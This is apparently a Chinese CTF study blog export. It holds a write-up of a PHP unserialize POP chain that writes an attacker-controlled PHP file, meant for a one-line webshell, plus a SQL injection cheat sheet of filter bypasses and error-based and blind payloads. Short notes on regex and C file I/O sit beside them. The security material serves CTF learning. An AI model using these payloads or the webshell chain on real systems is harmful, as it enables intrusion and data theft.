class="hljs-string">&quot;/[&lt;&gt;?]/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;var2)) &#123;<span class="hljs-comment">//操了，又是正则匹配；翻译: 在*后加?表示非贪婪最小匹配，表达式匹配&lt;&gt;，总感觉哪里有些不对</span><br>        <span class="hljs-comment">//确实不对，他的意思是禁止左括号、右括号、问号，但这也是阔以绕过的----当被匹配的参数$this-&gt;var2为数组时，即可绕过(虽然会警告但是仍阔以执行)</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hhhhacker!!!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$this</span>-&gt;var2); <span class="hljs-comment">//网上可搜到该函数漏洞，把1个字符串写到文件里(指菜刀payload)，没使用FILE_APPEND追加</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];   <span class="hljs-comment">//追踪!!!!</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br>&#125; <br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] == <span class="hljs-string">&#x27;phpinfo&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();   <span class="hljs-comment">//输出关于php配置的信息(完了，一点不懂，但这肯定是有用的)</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>阔以看到里面有个write函数，作用是结合用户输入的参数读取文件，于是就想到要调用这个函数，咋调用捏?<br>然后阔以看到c类里有个__call(的)魔术函数，里面的call_user_func调用$this-&gt;var1的函数，自然也阔以调用write函数<br>那么如何调用__call呢？这就要利用__call作为魔术函数的特性，__call函数在对象调用1个不可访问(b不存在)的方法时会被调用</p><p>那么看看我们阔以控制的变量$a，在被反序列化后就啥也没干了，这有啥漏洞呢? </p><p>继续审，看到class B里的__set()函数阔以执行，然后搜索__set函数怎样能被调动: 在给不可访问或不存在的属性赋值时set会被调用, so….</p><p>大佬的构造是:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>[]=<span class="hljs-string">&quot;&lt;?php phpinfo();?)&gt;&quot;</span>  <span class="hljs-comment">//创造数组，因为数组可以绕过preg_match，里面是payload</span><br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">D</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$content</span>);           <span class="hljs-comment">//数组塞进d，D类里有write(),创建文件夹sandbox，然后md5($this-&gt;var1.ip地址).&quot;.php&quot;;然后$this-&gt;var2作为php语句写入文件 </span><br><span class="hljs-variable">$array</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$d</span>,<span class="hljs-string">&#x27;write&#x27;</span>);       <span class="hljs-comment">//array()将2个参数填入数组</span><br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$array</span>);              <span class="hljs-comment">//C类有__call()，__call()里有call_user_func(this-&gt;var1)</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();                   <span class="hljs-comment">//B类的__set($p1,$p2)执行p2类下的p1函数，p2-&gt;p1()，__construct()啥也没干</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>(<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>);             <span class="hljs-comment">//A类有__destruct():$this-&gt;var1-&gt;secret = $this-&gt;var2; </span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);         <br></code></pre></td></tr></table></figure><p>然后我们理解一下，在payload被反序列化后，__destruct()通常在脚本结束前被调用执行，于是A类的__destruct被调用，$b-&gt;secret&#x3D;$c，然而我们构造的$b为B类属性，没有$secret，因此相当于访问了1个8存在的属性，于是就会调用B类的__set()方法, 但__set()的参数是啥? 可以先猜一波是$c里的$array里的$d,’write’(百度一波)，然后$d的write函数被调用，$d-&gt;$var1&#x3D;’’, 即没有，$d-&gt;var2&#x3D;$content，即1个数组，阔以绕过preg_match，虽然触发警告但仍然阔以成功执行 file_put_contents()函数，于是文件就被写入了</p><p>另外要学会看php的官方文档</p><p>然后我们访问这个文件，里面的php代码就会被执行，然后阔以把content设置为一句话木马，就可以用菜刀连接了</p><p>这道题让我发现了自己的代码审计水平有多菜</p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><p>之前没做过类似的题，这次记录一下</p><p>大致就是在一些音频编辑软件里打开，俺用的Audacity，但是听说看8了5.1声道，可以用Adoble Audition</p><p>然后查看里面的不同声道，发现里面有2个声道里面只有3个调调，联想到摩斯电码。如图</p><p><img src="/images/%E6%8A%97%E7%96%ABctf/misc(1).png"></p><p>然后根据规律，出现从不连续出现的应该是横杠(间隔)，其他两个代表什么分别试试就知道了</p><p>解出来1个乱码，也8知道是8是，因为没法提交验证了。。</p><h2 id="rpg"><a href="#rpg" class="headerlink" title="rpg"></a>rpg</h2><p>Noah师傅出的很有意思的1道题</p><p>里面是个游戏，找遍了地图也没啥可以触发的。于是意识到需要通过改游戏角色的金币来获取flag</p><p>于是把下载的文件翻了个遍，最后发现.rvdata后缀的文件很可疑，因为每创建1个存档，就会多出1个这个文件。于是意识到阔以通过这个方式修改存档，但打开后是部分可识别，部分则是乱码，改了编码方式也没用。于是搜索.rvdata相关内容，很幸运的找到一个网站，阔以在线识别并修改.rvdata的数据:<a href="https://www.saveeditonline.com/">链接</a>，往进去一拖分分钟搞定</p><h2 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h2><p>就提一下，有的是RGB全点，有的是只点1个，但不是瞎几把乱点….</p><h2 id="队伍赛-base的revenerge"><a href="#队伍赛-base的revenerge" class="headerlink" title="队伍赛-base的revenerge"></a>队伍赛-base的revenerge</h2><p>下载打开，类似base64编码的乱码，推荐1个8错的自动识别编码的在线网站: <a href="https://cyberchef.bacde.me/">cyberchef</a></p><p>然后解码1次后还是乱码，而且这个乱码完全没法识别，没啥规律，也8是base58，如下图</p><p><img src="/images/%E6%8A%97%E7%96%ABctf/misc(2).png"></p><p>网上找找资料，符合这种乱码的有几种可能:<br>1、词频加密(只在某文章出现过，意思是把不同符号出现的次数从大到小或从小到大排列，然后看是8是能组成有规律的一串字符)<br>2、UUencode，特点是有很多字符<br>3、xxencode，文本和base64类似，但比base64多了个’-‘字符，少了个’&#x2F;‘字符</p><p>但是将部分文本拖入在线网站解码后，排除234的可能性，至于1，真的有可能吗?写个脚本试试</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>赛事</category>
      
    </categories>
    
    
    <tags>
      
      <tag>赛事</tag>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式备忘速查</title>
    <link href="/2022/01/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%80%9F%E6%9F%A5/"/>
    <url>/2022/01/05/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E9%80%9F%E6%9F%A5/</url>
    
    <content type="html"><![CDATA[<p>因为平时不怎么用，而要用的时候老是忘….就干脆把常用的做个笔记</p><h1 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h1><h2 id=""><a href="#" class="headerlink" title="^:"></a>^:</h2><p>1、匹配输入字符串的开始位置<br>2、[^]表示[]内的内容不匹配<br>eg:<br>^[^ABC]$</p><h2 id="-1"><a href="#-1" class="headerlink" title="$:"></a>$:</h2><p>匹配输入字符串的结尾位置</p><h2 id="-2"><a href="#-2" class="headerlink" title="+:"></a>+:</h2><p>匹配单个或多个<br>eg:<br>^[0-9]$匹配单个数字，^[0-9]+$匹配多个数字)<del>(可不是拼接的意思)</del><br>^fu+Ck$，可匹配fuCk、fuuuuuuuuuuuuuuuuuuuuCk、fuuuuCk,不可匹配fck(+前的字符至少出现1次)</p><h2 id="-3"><a href="#-3" class="headerlink" title="*:"></a>*:</h2><p>和+类似，<em>前面的字符可出现1次、n次，也可不出现<br>eg:<br>^abc</em>$可匹配abcccccccccc、ab、a</p><h2 id="-4"><a href="#-4" class="headerlink" title="?:"></a>?:</h2><p>和+类似，但?前的字符只能出现0或1次</p><h2 id="-5"><a href="#-5" class="headerlink" title="[]:"></a>[]:</h2><p>里面是你要匹配的内容<br>eg: ^[0-9a-z_-]$，匹配字符a-z、0-9、下划线_和-</p><h2 id="-6"><a href="#-6" class="headerlink" title="{}:"></a>{}:</h2><p>限定[]所匹配的字符串的长度<br>用法:{a,b}，{n,}(最少匹配n次)，{n}(匹配n次)</p><p>eg: ^[a-z]{3-9}$无法匹配aaaaaaaaaaaaaaaaaaaaaaaa和aa，因为它们太长或太短</p><h1 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h1><h2 id="s"><a href="#s" class="headerlink" title="\s:"></a>\s:</h2><p>匹配所有空白符</p><h2 id="s-1"><a href="#s-1" class="headerlink" title="\s:"></a>\s:</h2><p>匹配所有非空白符，但不包括换行</p><p>所以^[\s\S]$表示匹配所有字符</p><h2 id="w"><a href="#w" class="headerlink" title="\w"></a>\w</h2><p>匹配字母、数字、下划线，即[A-Za-z_0-9]</p><h2 id="d"><a href="#d" class="headerlink" title="\d"></a>\d</h2><p>匹配数字</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>open和fopen区别、虚拟内存</title>
    <link href="/2021/12/29/open%E5%92%8Cfopen%E5%8C%BA%E5%88%AB/"/>
    <url>/2021/12/29/open%E5%92%8Cfopen%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>其实没必要水的，然而就是老记混open和fopen，于是顺便学学其他的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fcntl.h&gt;</span>   <span class="hljs-comment">//文件控制库</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> f1=open(<span class="hljs-string">&quot;D:\\desktop\\dick.txt&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span>(f1==<span class="hljs-number">-1</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Err0r!!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-type">char</span> ch1[<span class="hljs-number">100</span>];<br>    <span class="hljs-type">int</span> len=read(f1,ch1,<span class="hljs-number">100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,ch1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;len=%d&quot;</span>,len);<br>    close(f1);<br><br>    <span class="hljs-comment">/*----------------------------------*/</span><br>    <br>    FILE *f2=fopen(<span class="hljs-string">&quot;D;\\desktop\\dick.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-type">char</span> ch2[<span class="hljs-number">100</span>];<br>    fread(ch2,<span class="hljs-number">1</span>,<span class="hljs-number">100</span>,f2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,ch2);<br>    fclose(f2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后，fopen是标准c库函数，open是系统函数，使用open返回的是文件描述符，而是用fopen返回的则是文件指针</p><h2 id="文件描述符和文件指针关系："><a href="#文件描述符和文件指针关系：" class="headerlink" title="文件描述符和文件指针关系："></a>文件描述符和文件指针关系：</h2><p>程序运行后变成进程，在内存的进程管理中，有个文件描述符表，每打开一个文件，就占用一个文件描述符<del>(算了反正半懂不懂也是忘)</del><br>文件描述符才能找到文件在磁盘(即虚拟内存)中对应的位置</p><p>文件指针就是文件描述符和缓冲区(在物理内存上)的封装，数据先写到缓冲区，再写到磁盘</p><h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>电脑中所有运行的程序都需要内存来执行,如果执行的程序很大，会导致内存消耗殆尽。为了解决这个问题，WINDOWS运用了虚拟内存技术，即拿出一部分硬盘空间来充当内存使用，这部分空间即称为虚拟内存(作为内存使用的一部分硬盘空间)，虚拟内存在硬盘上的存在形式就是 C:\PAGEFILE.SYS</p><p>与虚拟内存相对应的就是物理内存，绝大部分程序8会直接访问物理内存(危险)，物理内存一般由操作系统访问</p><h2 id="fopen和open区别"><a href="#fopen和open区别" class="headerlink" title="fopen和open区别"></a>fopen和open区别</h2><p>所以综上所述就是，标准c库函数操控系统函数访问文件，标准c库函数无法直接读写文件</p><p>以及在读写时标准c库函数比系统函数多了个缓冲区的流程</p><p>卧槽我居然看懂了我好牛逼??</p><h2 id="fopen、open参数"><a href="#fopen、open参数" class="headerlink" title="fopen、open参数"></a>fopen、open参数</h2><p>open():<br>O_RDONLY　　只读打开<br>O_WRONLY　 只写打开<br>O_RDWR 读写打开</p><p>fopen():<br>r<br>w<br>a: 追加到一个文件(写入时在末尾写写入)<br>“r+”打开一个用于更新的文件，可读取也可写入。该文件必须存在。<br>“w+”创建一个用于读写的空文件。<br>“a+”打开一个用于读取和追加的文件。</p>]]></content>
    
    
    <categories>
      
      <category>寄科</category>
      
      <category>编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>寄科</tag>
      
      <tag>编程</tag>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入姿势总结</title>
    <link href="/2021/12/17/sql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E7%9A%84%E6%80%BB%E7%BB%93/"/>
    <url>/2021/12/17/sql%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%E7%9A%84%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>大佬绕过<br>很久没刷sql注入了，然后就忘得差8多了，为此觉得有必要总结一手</p><!-- about --><p>注意在hackbar里输入+之类的符号和在url栏里输入是有差别的</p><h1 id="关于绕过"><a href="#关于绕过" class="headerlink" title="关于绕过"></a>关于绕过</h1><h2 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h2><p>当sql语句是用单引号闭合，而单引号又被限制时，绕过的一些方法</p><h3 id="用-将原有的’转义掉"><a href="#用-将原有的’转义掉" class="headerlink" title="用\将原有的’转义掉"></a>用\将原有的’转义掉</h3><p>eg:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">username</span>=1\&amp;password=1 <span class="hljs-keyword">or</span> <span class="hljs-attribute">1</span>=1#<br></code></pre></td></tr></table></figure><p>(此处注意，如果浏览器使用burp代理或hackbar发送,注意检查把payload中的’&#39;换成’\‘，否则会发现burp在发送请求时’&#39;已经被转义，图为burp代理下用hackbar发送请求结果)<br><img src="/images/sql%E6%B3%A8%E5%85%A5(1).png"></p><h3 id="用char-函数绕过"><a href="#用char-函数绕过" class="headerlink" title="用char()函数绕过"></a>用char()函数绕过</h3><p>eg:<br>将 where table_schema&#x3D;’c’替换为where table_schema&#x3D;char(99)</p><h3 id="宽字节攻击绕过"><a href="#宽字节攻击绕过" class="headerlink" title="宽字节攻击绕过"></a>宽字节攻击绕过</h3><p>宽字节注入原理：<br>GBK 占用两字节<br>ASCII占用一字节<br>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。<br>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ &#x3D;%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><h3 id="注释绕过空格"><a href="#注释绕过空格" class="headerlink" title="注释绕过空格"></a>注释绕过空格</h3><p>eg: </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">/*!select*/</span><span class="hljs-comment">/*!version()*/</span><br></code></pre></td></tr></table></figure><p>emmmmmm….</p><h2 id="等于号绕过"><a href="#等于号绕过" class="headerlink" title="等于号绕过"></a>等于号绕过</h2><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;geek&#x27;</span><br><span class="hljs-keyword">where</span> (table_schema) <span class="hljs-keyword">like</span> (<span class="hljs-string">&#x27;geek&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="关键词绕过"><a href="#关键词绕过" class="headerlink" title="关键词绕过"></a>关键词绕过</h2><h3 id="双写绕过-大小写绕过"><a href="#双写绕过-大小写绕过" class="headerlink" title="双写绕过 &amp;&amp; 大小写绕过"></a>双写绕过 &amp;&amp; 大小写绕过</h3><p>selselectect<br>mysql是8分大小写的，你懂的</p><h3 id="16进制-绕过被屏蔽的表名、列名、数据库名"><a href="#16进制-绕过被屏蔽的表名、列名、数据库名" class="headerlink" title="16进制: 绕过被屏蔽的表名、列名、数据库名"></a>16进制: 绕过被屏蔽的表名、列名、数据库名</h3><p>用16进制编码代替关键字，只可用来查询被屏蔽的表名等(8能绕过select)<br>比如’admin’的16进制:<br>0x61<br>0x64<br>0x6d<br>0x69<br>0x6e<br>于是:<br>select * from user where username &#x3D; 0x61646d696e;</p><h2 id="关键字过滤-代替表"><a href="#关键字过滤-代替表" class="headerlink" title="关键字过滤-代替表"></a>关键字过滤-代替表</h2><p>空格: &#x2F;**&#x2F; %20 %a0 %0a +<br>and: &amp;&amp;<br>or: ||<br>limit: having<br>select: ⼀般是堆叠注⼊</p><p>information_schema:<br>mysql.innodb_table_stats<br>innodb_index_stats<br>sys.schema_table_statistics_with_buffer<br>sys.schema_auto_increment_columns</p><h3 id="handler绕过select过滤"><a href="#handler绕过select过滤" class="headerlink" title="handler绕过select过滤"></a>handler绕过select过滤</h3><p>handler是mysql专用的</p><h1 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h1><p>虽说应该记住，但不练手老是忘…<br>group_concat(id,username,passowrd) from table1;<br>group_concat: 把column里的所有内容用,连成1个<br>database()<br>查询schema:<br>-1’ ununionion seleselectct 1,2,schema_name frofromm infoorrormation_schema.schemata;#    &#x2F;&#x2F;此处是information_schema.schemata<br>show databases;</p><h1 id="基础有回显的注入"><a href="#基础有回显的注入" class="headerlink" title="基础有回显的注入"></a>基础有回显的注入</h1><h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><h3 id="什么是双查询注入"><a href="#什么是双查询注入" class="headerlink" title="什么是双查询注入"></a>什么是双查询注入</h3><p>双查询注入，俺的理解大概就是就是select语句里再套1个select，比如: select concat((select database()));</p><h3 id="双查询注入原理"><a href="#双查询注入原理" class="headerlink" title="双查询注入原理"></a>双查询注入原理</h3><p>就是利用报错来回显数据<br>原理: 有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来<br>若想详细了解，阔以参考这篇博客: <a href="https://blog.csdn.net/lixiangminghate/article/details/80466257">链接</a></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="利用limit-n-1"><a href="#利用limit-n-1" class="headerlink" title="利用limit n,1"></a>利用limit n,1</h4><p>有时候会限制输出的行数，这时往往会报错: Subquery returns more than 1 row<br>这时就要巧用limit，比如: </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>)<br>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>)<br>.<br>.<br>.<br></code></pre></td></tr></table></figure><h2 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h2><p>eg: </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> count(*),concat((payload),floor(rand()*<span class="hljs-number">2</span>))<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>搬运工，阔以看看这个<a href="https://blog.csdn.net/lixiangminghate/article/details/80466257">双查询报错原理</a><br>大致就是利用floor报错。<del>听君一席话，如听一席话</del></p><h2 id="updatexml-报错"><a href="#updatexml-报错" class="headerlink" title="updatexml()报错"></a>updatexml()报错</h2><p>eg: </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and updatexml(<span class="hljs-number">1</span>,concat(&#x27;~&#x27;,(<span class="hljs-name">payload</span>)),<span class="hljs-number">1</span>)-- <br></code></pre></td></tr></table></figure><p>原理简单，不解释，继续搬运, <a href="https://www.cnblogs.com/remon535/p/12547932.html">updatexml()报错原理</a><br>concat时也阔以用’<del>‘等xml格式不支持的字符eg: concat(‘</del>‘,(payload),1) , 以~开头的东东8是xml语法，就会返回报错</p><h2 id="extractValue-报错"><a href="#extractValue-报错" class="headerlink" title="extractValue()报错"></a>extractValue()报错</h2><p>eg:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">&#x27;shit&#x27;</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-string">&#x27;~&#x27;</span>,payload))<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>搬运。。。<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">extractValue()报错原理</a><br>和updatexml()原理类似<br><img src="/images/sqli_labs/sqli_labs(5).png"><br>0hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh!!!!!!!!!!!!!!!!</p><h1 id="我超，到盲注了"><a href="#我超，到盲注了" class="headerlink" title="我超，到盲注了"></a>我超，到盲注了</h1><p>参考:<a href="https://blog.csdn.net/szlg510027010/article/details/107171100/">链接</a><br>盲注就是在注入过程中数据不能回显到前端页面，全靠猜(所以叫布尔)<br>而又因为全靠猜，所以得搓脚本</p><p>3种类型: 基于布尔、时间、报错的盲注</p><h2 id="大致说明"><a href="#大致说明" class="headerlink" title="大致说明"></a>大致说明</h2><p>基于时间: 注入，猜测是对是错，由时间来做抉择，如果是对，延迟几秒再显示页面，如果是错，就正常显示页面</p><p>基于布尔: 其实跟时间很像，只不过做裁决的不再是时间，而是返回的数据本身，比如，在sqli_labs第8关里，查ABC这一数据，问第一个字母的 ASCII 值是不是大于 100 ，如果正确，页面就会显示 you are in…，如果错误就什么都不显示</p><p>基于报错，通过一些函数特性报错得到需要的结果</p><h2 id="可能会用到的payload"><a href="#可能会用到的payload" class="headerlink" title="可能会用到的payload"></a>可能会用到的payload</h2><h3 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)-- <br></code></pre></td></tr></table></figure><h3 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),floor(rand()*<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>如果information_schema报错了，那就用: </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> !<span class="hljs-number">1</span>) <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),floor(rand()*<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>如果rand被禁用了，可以使用用户变量来报错(用了一下，不明觉厉)：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">min</span>(<span class="hljs-variable">@a</span>:=<span class="hljs-number">1</span>) <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">information_schema</span><span class="hljs-selector-class">.tables</span> <span class="hljs-selector-tag">group</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-tag">concat</span>(password,<span class="hljs-variable">@a</span>:(<span class="hljs-variable">@a</span>+<span class="hljs-number">1</span>)%<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>还可以利用double数值类型超出范围，exp() 为以 e 为底的对数函数，mysql 版本需为 5.5.5 及其以上(用了一下，它的报错返回不明所以，先留着吧)</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))<br></code></pre></td></tr></table></figure><p>利用 mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误<br>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p><h3 id="大致操作流程"><a href="#大致操作流程" class="headerlink" title="大致操作流程"></a>大致操作流程</h3><p>首先判断你要查的东西的名字长度，比如数据库:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 